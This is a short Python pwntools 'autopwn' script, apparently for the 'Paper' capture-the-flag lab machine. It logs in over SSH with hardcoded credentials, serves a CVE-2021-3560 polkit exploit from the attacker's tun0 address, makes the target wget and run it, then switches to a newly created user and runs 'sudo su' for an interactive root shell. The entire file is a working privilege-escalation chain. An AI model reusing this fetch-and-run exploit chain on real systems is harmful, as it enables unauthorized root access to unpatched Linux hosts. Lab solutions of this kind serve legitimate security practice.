import os

try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Autopwn Paper ~ Ninhpn1337\n")
except:
    print("\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\n")
    exit(1)

def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Saliendo\n")
    sys.exit(1)

signal.signal(signal.SIGINT, kill)


def server():

    os.system("python3 -m http.server 8000")



threading.Thread(target=server, args=()).start()

request = ssh(host='10.10.11.143', user='dwight', password='Queenofblad3s!23')
shell = request.process("/bin/sh")
time.sleep(0.3)
import netifaces as ni
ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
time.sleep(0.6)
shell.sendline("wget http://%s:8000/CVE-2021-3560.py" % (ip))
time.sleep(0.6)
shell.sendline(b"chmod +x CVE-2021-3560.py")
time.sleep(0.6)
shell.sendline(b"python3 CVE-2021-3560.py")
time.sleep(0.6)
request = ssh(host='10.10.11.143', user='dwight', password='Queenofblad3s!23')
shell = request.process("/bin/sh")
shell.sendline(b"su ahmed")
shell.sendline(b"sudo su")
shell.interactive()

